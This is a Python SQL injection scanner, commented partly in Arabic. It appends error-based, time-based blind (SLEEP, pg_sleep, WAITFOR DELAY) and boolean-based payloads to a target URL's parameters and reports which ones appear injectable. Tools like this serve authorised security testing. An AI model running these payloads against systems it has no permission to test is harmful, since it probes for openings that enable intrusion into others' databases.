#!/usr/bin/env python3
import requests
import sys
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

HEADERS = {'User-Agent': 'Mozilla/5.0 (Security-Scanner)'}

# Error-based payloads
ERROR_PAYLOADS = [
    "'",
    "\"",
    "')",
    "';",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--",
    "' AND 1=1--",
    "' AND 1=2--",
]

# Error signatures (MySQL, PostgreSQL, Oracle, MSSQL, SQLite)
ERROR_SIGNATURES = [
    'SQL syntax',
    'mysql_fetch',
    'mysqli_',
    'PostgreSQL',
    'pg_query',
    'ORA-',
    'Oracle error',
    'Microsoft OLE DB',
    'ODBC SQL Server',
    'SQLServer JDBC',
    'SQLite',
    'sqlite3',
    'syntax error',
    'unclosed quotation',
    'quoted string not properly terminated',
    'You have an error in your SQL',
]

# Time-based payloads
TIME_PAYLOADS = [
    ("' OR SLEEP(5)--", 5),      # MySQL
    ("'; SELECT pg_sleep(5)--", 5),  # PostgreSQL
    ("' OR WAITFOR DELAY '0:0:5'--", 5),  # MSSQL
    ("' AND SLEEP(5)--", 5),
]

def test_error_based(url, param):
    """يختبر Error-based SQLi"""
    for payload in ERROR_PAYLOADS:
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            original = params[param][0]
            params[param] = [original + payload]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            
            r = requests.get(new_url, headers=HEADERS, timeout=5)
            
            for sig in ERROR_SIGNATURES:
                if sig.lower() in r.text.lower():
                    return {
                        'type': 'ERROR-BASED',
                        'param': param,
                        'payload': payload,
                        'signature': sig,
                        'url': new_url,
                        'severity': 'HIGH'
                    }
        except:
            pass
    return None

def test_time_based(url, param):
    """يختبر Time-based Blind SQLi"""
    # قياس الوقت الأصلي
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        original = params[param][0]
        
        # الوقت الأصلي
        start = time.time()
        requests.get(url, headers=HEADERS, timeout=15)
        baseline = time.time() - start
        
        # اختبار كل payload
        for payload, delay in TIME_PAYLOADS:
            params[param] = [original + payload]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            
            start = time.time()
            try:
                requests.get(new_url, headers=HEADERS, timeout=delay + 5)
                elapsed = time.time() - start
                
                if elapsed >= delay - 0.5:
                    return {
                        'type': 'TIME-BASED BLIND',
                        'param': param,
                        'payload': payload,
                        'delay': f'{elapsed:.2f}s',
                        'url': new_url,
                        'severity': 'HIGH'
                    }
            except requests.Timeout:
                return {
                    'type': 'TIME-BASED BLIND (timeout)',
                    'param': param,
                    'payload': payload,
                    'delay': f'>{delay}s',
                    'url': new_url,
                    'severity': 'HIGH'
                }
    except:
        pass
    return None

def test_boolean_based(url, param):
    """يختبر Boolean-based Blind SQLi"""
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        original = params[param][0]
        
        # الطلب الأصلي
        r_orig = requests.get(url, headers=HEADERS, timeout=5)
        orig_len = len(r_orig.text)
        
        # TRUE payload
        params[param] = [original + "' AND 1=1--"]
        new_query = urlencode(params, doseq=True)
        url_true = urlunparse(parsed._replace(query=new_query))
        r_true = requests.get(url_true, headers=HEADERS, timeout=5)
        true_len = len(r_true.text)
        
        # FALSE payload
        params[param] = [original + "' AND 1=2--"]
        new_query = urlencode(params, doseq=True)
        url_false = urlunparse(parsed._replace(query=new_query))
        r_false = requests.get(url_false, headers=HEADERS, timeout=5)
        false_len = len(r_false.text)
        
        # إذا TRUE == Original و FALSE مختلف → Boolean-based
        if abs(true_len - orig_len) < 100 and abs(false_len - orig_len) > 500:
            return {
                'type': 'BOOLEAN-BASED BLIND',
                'param': param,
                'payload': "' AND 1=1--",
                'true_len': true_len,
                'false_len': false_len,
                'url': url_true,
                'severity': 'HIGH'
            }
    except:
        pass
    return None

def scan_sqli(url):
    print(f"\n{'='*60}")
    print(f"  SQL Injection Scanner")
    print(f"  Target: {url}")
    print(f"{'='*60}\n")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[-] No parameters found")
        print("[*] Example: https://example.com/page?id=1")
        return []
    
    print(f"[*] Found {len(params)} parameter(s): {list(params.keys())}\n")
    
    findings = []
    
    for param in params:
        print(f"[*] Testing parameter: {param}")
        
        # Error-based
        result = test_error_based(url, param)
        if result:
            findings.append(result)
            print(f"  [!] ERROR-BASED SQLi")
            print(f"      Payload: {result['payload']}")
            print(f"      Signature: {result['signature']}")
            print(f"      URL: {result['url']}\n")
        
        # Time-based
        result = test_time_based(url, param)
        if result:
            findings.append(result)
            print(f"  [!] TIME-BASED BLIND SQLi")
            print(f"      Payload: {result['payload']}")
            print(f"      Delay: {result['delay']}")
            print(f"      URL: {result['url']}\n")
        
        # Boolean-based
        result = test_boolean_based(url, param)
        if result:
            findings.append(result)
            print(f"  [!] BOOLEAN-BASED BLIND SQLi")
            print(f"      Payload: {result['payload']}")
            print(f"      True: {result['true_len']} / False: {result['false_len']}")
            print(f"      URL: {result['url']}\n")
    
    print(f"\n{'='*60}")
    print(f"  Found: {len(findings)} potential SQLi")
    print(f"{'='*60}\n")
    
    return findings

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 sqli_scanner.py <url>")
        print("Example: python3 sqli_scanner.py 'https://example.com/product?id=1'")
        sys.exit(1)
    
    scan_sqli(sys.argv[1])
